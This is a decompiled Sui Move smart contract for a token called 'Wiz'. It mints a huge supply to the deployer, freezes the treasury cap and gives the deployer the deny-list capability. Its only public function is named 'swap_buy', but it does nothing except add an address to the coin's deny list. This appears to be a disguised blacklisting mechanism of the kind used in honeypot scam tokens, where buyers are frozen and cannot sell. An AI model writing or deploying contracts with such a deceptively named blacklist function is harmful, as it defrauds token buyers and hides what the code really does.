module 0x121c3ff0826eda77c1c3bcdd341dacc6305ab4c315a2fbfd0d69feaf5784ba76::wiz {
    struct WIZ has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: WIZ, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<WIZ>(arg0, 9, b"Wiz", b"Wiz", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmW63oJbuXmSJURbGTvyMBLC1YvwbbQdUCWSY6CzFfK7Ah"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<WIZ>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<WIZ>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<WIZ>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<WIZ>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WIZ>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<WIZ>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

